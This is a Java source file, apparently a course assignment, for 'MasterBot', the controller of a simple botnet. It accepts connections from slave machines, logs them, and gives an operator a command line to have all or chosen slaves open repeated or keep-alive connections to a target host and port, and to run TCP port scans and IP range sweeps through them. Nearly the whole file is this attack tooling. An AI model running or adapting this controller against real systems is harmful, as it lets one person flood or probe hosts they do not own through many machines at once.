package pkg206.tp.p1;
import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MasterBot extends Thread 
{
	// variables
    	static String slaveIP, targetIP, keepAliveOrURL, targetPortRange, targetIPRange, targetIPStart, targetIPEnd;
        static int connectedSlaves, targetPort, connectionCount, targetPortStart, targetPortEnd;


	private ServerSocket ss;
	static ArrayList<Socket> slaveList = new ArrayList<>();
	static SlaveBot sb = new SlaveBot();
	
	// constructor
	public MasterBot(int port) throws IOException 
	{
		ss = new ServerSocket(port);
	}
        
	// run threads
	public void run() 
	{
		BufferedWriter bw = null;
		String info = "";
                connectedSlaves = 0;

        // create file to store the slave info
		try 
		{
			File f = new File("slaveInfo.txt");
			bw = new BufferedWriter(new FileWriter(f));
			Date date = new Date();
			info = "SlaveHostName" + "\t" + "IPAddress" + "\t\t" + "SourcePortNumber" + "\t" + "RegistrationDate";
			bw.write(info);

			while (true) 
			{
				Socket ss = new Socket();
				ss = this.ss.accept();
				slaveList.add(ss);
				connectedSlaves++;
				bw.newLine();
				bw.newLine();
                    				
				info = "Slave" + connectedSlaves + "\t";
				bw.write(info);

				info = "\t" + ss.getRemoteSocketAddress() + "\t";
				bw.write(info);

				info = ss.getPort() + "\t\t";
				bw.write(info);

				info = "\t" + new SimpleDateFormat("yyyy-MM-dd").format(date);
				bw.write(info);

				bw.flush();
			}

		} catch (IOException e) 
		{
			e.printStackTrace();
		}

		finally 
		{
			try 
			{
				ss.close();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}

        // main function
	public static void main(String[] args) 
	{
		String cli;
		BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
		int port = 0;
		//input example = "-p 9999"
		if (args.length != 0) 
		{
			port = Integer.parseInt(args[1]);
		} 
		//no input arguments given, use default port 1234
		else 
		{
			System.out.println("Using default port number 1234");
			port = 1234;
		}

		if (port != 0) 
		{
			try 
			{
				Thread thread = new MasterBot(port);
				thread.start();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
                
		// CLI
		while (true) 
		{
			try 
			{
				System.out.print("> ");
				cli = br1.readLine();
				// if nothing entered, loop
				if (cli.equals("")) 
				{
					continue;
				}

				// list command
				else if (cli.equals("list")) 
				{
					BufferedReader br2 = new BufferedReader(new FileReader("slaveInfo.txt"));
					String getLine;
					while ((getLine = br2.readLine()) != null) 
					{
						System.out.println(getLine);
					}
					System.out.println("\n" + " Number of available slaves: " + connectedSlaves);
					continue;
				}
				// connect command
				else if (cli.startsWith("connect")) 
				{
					// slave count = 0
					if(connectedSlaves == 0)
					{
						System.out.println("No Slaves are currently connected.");
						continue;
					}
					
					String[] dataArray = cli.split("\\s+");
					// connection count is not defined, default to 1
					if(dataArray.length == 4)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					// connection count is defined
					else if(dataArray.length == 5)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
                                                if(dataArray[4].equalsIgnoreCase("keepalive")){
						connectionCount = 1;
                                                keepAliveOrURL = "keepalive";
                                                }
                                                else{
						connectionCount = Integer.parseInt(dataArray[4]);
                                                   
                                                }
                                                
					}
                                        //keepalive option enabled with no connection count defined
                                        else if(dataArray.length == 6)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
                                                keepAliveOrURL = dataArray[5];
                                                
					}
					// all slaves
					if (slaveIP.equalsIgnoreCase("all"))
					{
						for(int i=0; i<slaveList.size(); i++)
						{
							for(int j=0; j<connectionCount; j++)
							{
								sb.connect(slaveList.get(i), targetIP, targetPort, keepAliveOrURL);
							}
						}
					}
                                        
					// specific slave (must enter "ip:port")
					else
					{
						String ipCheck, hostNameCheck;
						for(int i=0; i<slaveList.size(); i++)
						{
							ipCheck = "/"+slaveIP;
                                                        hostNameCheck = slaveIP;
                                                       
							if(ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString()))
							{
								for(int j=0; j<connectionCount; j++)
								{
									sb.connect(slaveList.get(i), targetIP, targetPort, keepAliveOrURL);
								}
							}
                                                        else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                                                        {
								for(int j=0; j<connectionCount; j++)
								{
									sb.connect(slaveList.get(i), targetIP, targetPort, keepAliveOrURL);
								}
                                                        }                                              
                                                        
                                                                                                              
						}
					}
					continue;
				}
                                
				//disconnect command
				else if (cli.startsWith("disconnect"))
				{
					// slave count = 0
					if(connectedSlaves == 0)
					{
						System.out.println("No Slaves are currently connected.");
						continue;
					}
					
					String[] dataArray = cli.split("\\s+");
					// connection count is not defined, default to 1
					if(dataArray.length == 4)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					// connection count is defined
					else if(dataArray.length == 5)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					// all slaves
					if (slaveIP.equalsIgnoreCase("all"))
					{
						for(int i=0; i<slaveList.size(); i++)
						{
							for(int j=0; j<connectionCount; j++)
							{
								sb.disconnect(slaveList.get(i), targetIP, targetPort);
							}
						}
					}
					// specific slave (must enter "ip:port")
					else
					{
						String ipCheck, hostNameCheck;
						for(int i=0; i<slaveList.size(); i++)
						{
							ipCheck = "/"+slaveIP;
                                                        hostNameCheck = slaveIP;

							if(ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString()))
							{
								for(int j=0; j<connectionCount; j++)
								{
									sb.disconnect(slaveList.get(i), targetIP, targetPort);
								}
							}
                                                        else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                                                        {
								for(int j=0; j<connectionCount; j++)
								{
									sb.disconnect(slaveList.get(i), targetIP, targetPort);
								}
                                                        } 
						}
					}
					continue;
				}
                                
                                //tcpportscan
                                else if (cli.startsWith("tcpportscan"))
				{
                                    
					// slave count = 0
					if(connectedSlaves == 0)
					{
						System.out.println("No Slaves are currently connected.");
						continue;
					}
					
					String[] dataArray = cli.split("\\s+");
					// 
					if(dataArray.length == 4)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
                                                targetPortRange = dataArray[3];
                                                
                                                String patternStr = "(\\d+)-(\\d+)";
                                                Pattern pattern = Pattern.compile(patternStr);
                                                Matcher matcher = pattern.matcher(targetPortRange);
                                        if (matcher.matches()) {
//                                                System.out.println(matcher.group(1) + " - " + matcher.group(2));
                                                targetPortStart = Integer.parseInt(matcher.group(1));
                                                targetPortEnd = Integer.parseInt(matcher.group(2));                                                       
                                        }                   

					}
					
					// all slaves
					if (slaveIP.equalsIgnoreCase("all"))
					{
                                            
                                            
//                                                                                                            System.out.println("Comes to ALL" + targetPortStart + " " + targetPortEnd);

						for(int i=0; i<slaveList.size(); i++)
						{
//							        System.out.println("Sends DATA" + targetPortStart + " " + targetPortEnd);

								sb.tcpportscan(slaveList.get(i), targetIP, targetPortStart, targetPortEnd);
						
						}
					}
					// specific slave (must enter "ip:port")
					else
					{
						String ipCheck, hostNameCheck;
						for(int i=0; i<slaveList.size(); i++)
						{
							ipCheck = "/"+slaveIP;
                                                        hostNameCheck = slaveIP;

							if(ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString()))
							{
								sb.tcpportscan(slaveList.get(i), targetIP, targetPortStart, targetPortEnd);
								
							}
                                                        else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                                                        {
								
								sb.tcpportscan(slaveList.get(i), targetIP, targetPortStart, targetPortEnd);
								
                                                        } 
						}
					}
					continue;
				}
                                
                                //tcpportscan
                                else if (cli.startsWith("ipscan"))
				{
                                    
					// slave count = 0
					if(connectedSlaves == 0)
					{
						System.out.println("No Slaves are currently connected.");
						continue;
					}
					
					String[] dataArray = cli.split("\\s+");
					// 
					if(dataArray.length == 3)
					{
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
                                                
                                                String[] targetIPRange = dataArray[2].split("\\-");
                                                targetIPStart = targetIPRange[0];
                                                targetIPEnd = targetIPRange[1];
                                                
  

					}
					
					// all slaves
					if (slaveIP.equalsIgnoreCase("all"))
					{
                                            
                                            
//                                                                                                            System.out.println("Comes to ALL" + targetPortStart + " " + targetPortEnd);

						for(int i=0; i<slaveList.size(); i++)
						{
//							        System.out.println("Sends DATA" + targetPortStart + " " + targetPortEnd);

								sb.ipscan(slaveList.get(i), targetIPStart, targetIPEnd);

						
						}
					}
					// specific slave (must enter "ip:port")
					else
					{
						String ipCheck, hostNameCheck;
						for(int i=0; i<slaveList.size(); i++)
						{
							ipCheck = "/"+slaveIP;
                                                        hostNameCheck = slaveIP;

							if(ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString()))
							{
								sb.ipscan(slaveList.get(i), targetIPStart, targetIPEnd);
								
							}
                                                        else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                                                        {
								
								sb.ipscan(slaveList.get(i), targetIPStart, targetIPEnd);
								
                                                        } 
						}
					}
					continue;
				}                                
                                
				// exit
				else if (cli.equalsIgnoreCase("exit")) 
				{
					System.out.println("Program exitting...");
					System.exit(0);
				}
				else
				{
					System.out.println("Please use one of the following commands: list, connect, disconnect and exit");
					continue;
				}
				
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}


}
		
